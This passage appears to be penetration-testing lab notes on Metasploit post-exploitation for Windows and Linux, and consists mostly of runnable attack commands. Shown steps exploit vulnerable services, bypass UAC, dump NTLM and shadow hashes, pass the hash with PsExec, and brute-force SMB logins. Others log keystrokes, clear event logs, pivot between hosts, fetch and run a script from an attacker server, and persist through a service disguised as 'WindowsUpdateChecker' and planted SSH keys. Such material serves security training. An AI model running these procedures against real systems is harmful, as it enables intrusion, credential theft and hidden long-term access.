# 2) The next module we can use is the enum_logged_on_users which as the name suggests, enumerates a list of currently and previous logged on users. 
use post/windows/gather/enum_logged_on_users

# 3) We can also check if the target system is a virtual machine by leveraging a module called checkvm. 
use post/windows/gather/checkvm

# 4) Another important module is the enum_applications module. This module enumerates a list of installed application/programs on the target system. 
use post/windows/gather/enum_applications
# This information is very useful as it can be used to search for vulnerabilities in the installed programs that can be leveraged or exploited to elevate your privileges or reveal important information. It also gives you an idea as to what this system is being used for.

# 5) We can utilize the enum_computers module to enumerate a list of computers connected to the same LAN that the target is a part of.
use post/windows/gather/enum_computers

# 6) We can also enumerate a list of shares by using the enum_shares module.
use post/windows/gather/enum_shares

# Other modules:
post/windows/gather/enum_av # Windows Installed AntiVirus Enumeration
post/windows/gather/enum_patches # Windows Gather Applied Patches
```

### 8.2. Windows Privilege Escalation: Bypassing UAC

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module. And then, bypass UAC using the Memory Injection Metasploit local exploit module.

**Objective:** Gain the highest privilege on the compromised machine and get administrator user NTLM hash.

```shell
# The target system has a vulnerable version of the Rejetto HTTP File Server running on port 80 that can be exploited through the use of a Metasploit module.
service postgresql start && msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <target_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

getuid
sysinfo
# We can observe that we are running as an admin user. Migrate the process in explorer.exe. First, search for the PID of explorer.exe and use the migrate command to migrate the current process to the explorer process.
pgrep explorer
migrate <process_ID>
getsystem
# We can observe that we do not have permission to elevate privileges.
# Get a windows shell and check if the admin user is a member of the Administrators group.
shell
net localgroup administrators
background
```

**Run UAC Bypass In-Memory Injection module.**

```shell
use exploit/windows/local/bypassuac_injection
set SESSION 1
set TARGET 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
# Please note the explorer.exe arch is x64 bit, so later when we perform UAC bypass, we have to use x64 based meterpreter payload.
getsystem
getuid

ps -S lsass.exe
migrate <process_ID>

hashdump
```

### 8.3. Pass - The - Hash With PsExec (Exploiting SMB With PsExec)

SMB (Server Message Block) is a network file sharing protocol that allows applications and users to read and write to files and request services from server programs in a computer network.

**Objective:** Exploit the SMB service with PsExec and retrieve the flag.

```shell
nmap <target_IP>

# We have discovered that multiple ports are open. The SMB port 445 is also exposed. We will run nmap script to list the supported protocols and dialects of a SMB server.
nmap -p445 --script smb-protocols <target_IP>

# We will run smb_login module to find all the valid users and their passwords.
msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS <target_IP>
set VERBOSE false
exploit

# We have found four valid users and their passwords. Running psexec module to gain the meterpreter shell.
use exploit/windows/smb/psexec
show info # read the Descritpion
set RHOSTS <target_IP>
set SMBUser <user>
set SMBPass <password>
set payload windows/x64/meterpreter/reverse_tcp
exploit

# Searching the flag
shell
cd /
dir
type flag.txt

# hash case of use
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec:::
# hash to use 
aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec
```

### 8.4. Establishing Persistence on Windows

In this section, we’ll explore how to establish persistent access to Windows targets. Once persistence is in place, we can regain access to the system anytime it’s online. To achieve this, we'll use various post-exploitation persistence modules, with a primary focus on one key method.

```shell
# Gain access to the system
service postgresql start && msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <target_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Verify system information and current privileges
systeminfo
getuid  # Check if the session has administrative privileges (required for persistence)

# Since the vulnerable Rejetto service could be patched in the future,
# we want to establish persistence to regain access without re-exploiting

# Background the current session to prepare for post-exploitation
background

# Search for persistence modules on Windows
search platform:windows persistence
use exploit/windows/local/persistence_service

# Set a compatible payload (non-staged reverse TCP)
set payload windows/meterpreter/reverse_tcp
show options

# Set the path where the payload executable will reside on the target (optional)
set REMOTE_EXE_PATH C:\\Windows\\Temp\\persistence.exe

# Set a legitimate-looking service name to avoid suspicion
set SERVICE_NAME WindowsUpdateChecker

# Link the persistence module to the current session
set SESSION 1

# Execute the persistence exploit
exploit

# Confirm you still have access
getuid
exit  # Exit the current session

# Kill all sessions to simulate loss of access
sessions -k

# To regain access, use the multi/handler module to catch the persistent connection
use multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set LHOST eth1  # Or your local IP address
run

# You should receive a new Meterpreter session from the persistent backdoor
```

### 8.5. Enabling Remote Desktop Protocol (RDP)

Explore a couple of modules to exploit a vulnerable application and gain an RDP session on the target.

**Objective:** Your task is to find and exploit the vulnerable application and get the RDP session to find the flag!

**Note:** rdesktop will not work on this setup as it does not support NLA. Please use xfreerdp to connect to the RDP server.

```shell
service postgresql start && msfconsole -q
workspace -a Enable_RDP
db_nmap -sS -sV -O <target_IP>
use exploit/windows/http/badblue_passthru
set RHOSTS <target_IP>
exploit
# We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.
sysinfo
getuid

# Enabling the RDP service using windows post exploitation module.
background
use post/windows/manage/enable_rdp
set SESSION 1
exploit
# RDP Service Started on the target
# The post exploit worked fine. Re-running nmap to check if RDP port is exposed or not.

db_nmap -p 3389 <target_IP>
# In this case we can see that port 3389 is now open, which means we now have RDP running on the target.
# 3389/tcp  open  ms-wbt-server

sessions -i 1
shell
net users # The net user command (without any parameters) displays a list of all user accounts on the Windows system.
net user administrator hacker_1234 # Changes the Administrator account password to 'hacker_123321'.
# In general not recommended as it clearly reveals system compromise

xfreerdp /u:administrator /p:hacker_1234 /v:<target_IP>
# Now we get the remote desktop.
```

### 8.6. Windows Key-Logging

```shell
# exploit BadBlue.
# enable RDP 

pgrep explorer
migrate <service_id>
keyscan_start  # Starts capturing keystrokes on the target machine.
# Now switch to the target system and type something manually (e.g., in a browser or text editor).
keyscan_dump  # Displays the captured keystrokes from the target.
```

### 8.7. Cleaning Windows Event Logs

Clearing tracks after exploiting a system is a crucial step for attackers who want to avoid detection and maintain access. Metasploit, a popular framework for developing and executing exploit code against a remote target machine, also includes techniques that can be used to cover tracks after an exploit.

**Objective:** Your task is to exploit the vulnerable application and then clear the Windows Event logs with Metasploit.

```shell
# Gain access to the system
service postgresql start && msfconsole
db_nmap -sV <target_IP>
use exploit/windows/http/badblue_passthru
set RHOSTS <target_IP>

sysinfo
getuid 

# Whenever you successfully gain access to a Windows target, all of your activity is being logged in the form of Windows events. Meterpreter provides you with the ability to clear the entire Windows Event log. This can be done by running the following command:
clearev
```

### 8.8. Windows Pivoting

Pivoting with port forwarding.

The concept of pivoting is a crucial technique in penetration testing that allows an attacker to move from one compromised system to another within the same network. By exploiting vulnerabilities on the initial target, you will gain access and then pivot to exploit and access a secondary target.

**Objective:** Exploit vulnerabilities in the target machines to gain access and retrieve a flag.

```shell
ping -c 1 <ip_victim_1>
ping -c 1 <ip_victim_2> # Target not reachable

nmap -sV <ip_victim_1>
searchsploit hfs 2.3

service postgresql start && msfconsole
workspace -a pivoting

# VICTIM 1
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS <ip_victim_1>
exploit

sysinfo
getuid
# We have successfully exploited the target vulnerable application (hfs) and received a meterpreter shell.
ipconfig
# We can observe, there is only one network adapter and we have two machine IP addresses but we cannot access “Victim Machine 2” directly from the attacker’s machine. We will add a route and then we will run an auxiliary port scanner module on the second victim machine to discover a host and open ports.
run autoroute -s <CIDR_notation> # e.g. 10.0.16.0/20

background

# VICTIM 2
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS <ip_victim_2> # Victim 2 was provided
set PORTS 1-100
exploit

# We have discovered port 80 on the pivot machine. Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap

sessions -i 1
portfwd add -l 1234 -p 80 -r <ip_victim_2>
portfwd list

# We have forwarded the port, now use Nmap to find the running application name and version.
db_nmap -sS -sV -p 1234 localhost
# We will search the exploit module for badblue 2.7 using searchsploit.
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS <ip_victim_2>
exploit
# We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.

shell
cd /
dir
type flag.txt
```

<br>

## 9. Linux Post Exploitation

### 9.1. Linux Post Exploitation Modules

**Objective**: Utilize various Metasploit post-exploitation modules to gather critical system data, including configurations, network details, environment variables, and user history, while also assessing system protections and executing commands remotely.

```shell
nmap -sS -sV -p- <target_IP>
service postgresql start && msfconsole
workspace -a Linux_PE
# Search for Samba-related exploits
search samba
use exploit/linux/samba/is_known_pipename # Use the known Samba exploit (CVE-2017-7494)
set RHOSTS <target_ip>
show options
check # Check if the target is vulnerable
exploit

background
# List all active sessions
sessions
# Upgrade a shell session to a Meterpreter session (if needed)
session -u 1
# Switch to an active Meterpreter session
sessions
sessions 2

# At this point, we have Meterpreter access to the target
sysinfo # Display system information
getuid # Check current user privileges

# Drop into a shell
shell
/bin/bash -i    # Get a fully interactive shell

# Perform basic system reconnaissance:
whoami # Check current user
cat /etc/passwd # List system users
groups root # Verify root group access
cat /etc/*issue # Show OS banner/version info
uname -r # Display kernel version
uname -a # Display full system info
ifconfig # Network interfaces and IPs
ip a s # Alternative to ifconfig, useful for pivoting
netstat -antp # List network connections and listening services
ps aux # List running processes
env # Show environment variables
```

Now let's see some **post exploitation modules** that we can use:

```shell
post/linux/gather/enum_configs
# Gathers configuration files from the target Linux system that may contain sensitive information.

post/multi/gather/env
# Collects environment variables from the target session, which may include credentials, paths, and system configuration.

post/linux/gather/enum_network
# Enumerates detailed network configuration, interfaces, routes, and DNS settings on the target Linux machine.

post/linux/gather/enum_protections
# Identifies security mechanisms in place on the target Linux system, such as SELinux, AppArmor, and hardening configs.

post/linux/gather/enum_system
# Collects general system information including OS version, kernel details, and system architecture.

post/linux/gather/checkcontainer 
# Detects if the current session is running inside a containerized environment like Docker or LXC.

post/linux/gather/checkvm
# Checks if the target system is running inside a virtual machine (e.g., VMware, VirtualBox, QEMU).

post/linux/gather/enum_users_history
# Extracts user shell histories (like .bash_history) to uncover commands previously executed by users.

use post/multi/manage/system_session
# This module is used to elevate a Meterpreter session to SYSTEM-level privileges, if possible, on the target machine.
set SESSION 1
set TYPE python
set HANDLER true
set LHOST 192.216.221.2
run
# Now, let’s create a bash file which will create a user on the target machine by uploading a test.sh file and execute it.
vim test.sh
useradd hacker
useradd test
useradd nick
# Now, let’s run the Apache server on the attacker’s machine and copy the test.sh file in the root folder.
/etc/init.d/apache2 start
cp test.sh /var/www/html

# Now, let’s use the download and exec post-exploitation module on the target machine.
use post/linux/manage/download_exec
# This module is used to download a file from a remote server to the target Linux machine and execute it.
set URL http://<my_IP>/test.sh
set SESSION 1
run
# Let’s verify it by interacting with the session.
sessions -i 1
cat /etc/passwd
```

### 9.2. Linux Privilege Escalation - Rootkit Scanner

This lab focuses on exploiting a vulnerable rootkit scanner on a Linux server, guiding participants through steps such as identifying services, gaining initial access, and performing local privilege escalation.

**Objective:** Escalate to the root user on the target machine and retrieve the flag!

**SSH Login Credentials**: 
Username: jackie
Password: password

```shell
nmap -sS -sV <target_IP>
service postgresql start && msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target_IP>
set USERNAME jackie
set PASSWORD password
exploit

# Interact with the shell session
sessions -i 1
# To identify the vulnerable program or service, we can list all running processes on the system using the following command:
ps aux
# Observe, that there are a couple of processes running i.e. cron and one bash script.
# Investigate the check-down bash script.
cat /bin/check-down
# The chkrootkit rootkit scanner is running as root every 60 seconds. Check the chkrootkit location and its version.
command -v chkrootkit
/bin/chkrootkit -V
# We found the chkrootkit binary location and its version. Searching privilege escalation exploit module for chkrootkit 0.49.

searchsploit chkrootkit 0.49

use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set SESSION <set_session_number>
set LHOST <target_IP>
exploit

cat /root/flag
```

### 9.3. Dumping Hashes and Enumeration

**Objective**: Utilize Metasploit post-exploitation modules to achieve system compromise, credential harvesting, and persistent access.

```shell
# Gain access to the system
nmap -sS -sV -p- <target_IP>
service postgresql start && msfconsoles
use exploit/linux/samba/is_known_pipename
set RHOST <target_IP>
check
exploit -z

# Use post exploitation Metasploit modules
use post/multi/gather/ssh_creds
# Extracts stored SSH credentials (usernames, passwords, keys) from the target system.
use post/multi/gather/docker_creds
# Gathers Docker-related credentials and configuration files from the target.
post/linux/gather/hashdump
set VERBOSE true
# Dumps password hashes from the /etc/shadow file on a compromised Linux system.
use post/linux/gather/ecryptfs_creds
# Retrieves credentials and keys used for eCryptfs-encrypted home directories.
use post/linux/gather/enum_psk
# Enumerates pre-shared keys (PSKs) used in VPN or wireless configurations on Linux systems.
post/linux/gather/enum_xchat
set XCHAT true
# Extracts stored credentials and logs from the XChat IRC client.
use post/linux/gather/phpmyadmin_credsteal
# Steals stored login credentials from phpMyAdmin configuration files.
use post/linux/gather/pptpd_chap_secrets
# Retrieves usernames and passwords from the PPTP VPN chap-secrets file.
use post/linux/manage/sshkey_persistence
# Installs an attacker-controlled SSH public key on the target to maintain persistent access.
```

### 9.4. Establishing Persistence On Linux

This section delves into the techniques for establishing persistent access on a Linux system. Participants are tasked with exploiting a vulnerable Linux server target. Through a series of steps, including initial access, privilege escalation, and establishing persistence.

**Objective**: Escalate to the root user on the target machine and retrieve the flag!

**SSH Login Credentials:**
Username: jackie
Password: password

**GAIN ACCESS TO THE TARGET**

```shell
nmap -sS -sV <target_IP>
service postgresql start && msfconsole
workspace -a Linux_Persistence
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target_IP>
set USERNAME jackie
set PASSWORD password
exploit

sessions
sessions -u 1

# To use the Metasploit persistence modules, we will first need to elevate our privileges on the Linux target.
```

**PRIVILEGE ESCALATION**

```shell
# The target system has a vulnerable version of chkrootkit installed that is vulnerable to privilege escalation and can be exploited through the use of a Metasploit module.
search chkrootkit
use exploit/unix/local/chkrootkit
set SESSION 2
set CHKROOTKIT /bin/chkrootkit # Set the path to the chkrootkit binary.
set LHOST <local_IP>
exploit
# The module runs successfully and provides us with an elevated command shell session on the target system.
# We can also upgrade this command shell session to a meterpreter session by running the following command:
sessions -u 3
```

**ESTABLISHING PERSISTENCE**

```shell
# Now that we have been able to elevate our privileges on the target system, we can begin exploring the process of establishing persistence.

# The best Metasploit module that can be used to establish persistent access on a Linux target is the sshkey_persistence module.
use post/linux/manage/sshkey_persistence
set SESSION <session_number>
set CREATESSHFOLDER true
exploit
# Storing new private key as /root/.msf4/loot/20250324161425_default_192.143.107.3_id_rsa_044033.txt

# To use the private key, copy the key and save it as a new file, in this case, we will be saving it in the home directory of the root user on the Kali Linux system as ssh_key.
# New terminal:
cat /root/.msf4/loot/20250324161425_default_192.143.107.3_id_rsa_044033.txt
cp /root/.msf4/loot/20250324161425_default_192.143.107.3_id_rsa_044033.txt ssh_key

# We will then need to assign the appropriate permissions to the file, this can be done by running the following commands:
chmod 0400 ssh_key

# We can now authenticate with the target using the private key via SSH by running the following command:
ssh -i ssh_key root@<target_domain_or_ip>

# As shown in the following screenshot, the authentication with the private key is successful and we have successfully been able to establish persistent access to the Linux target by adding our public key to the authorized_keys file of over user account, consequently allowing us to authenticate with the target via SSH without providing a password.
```

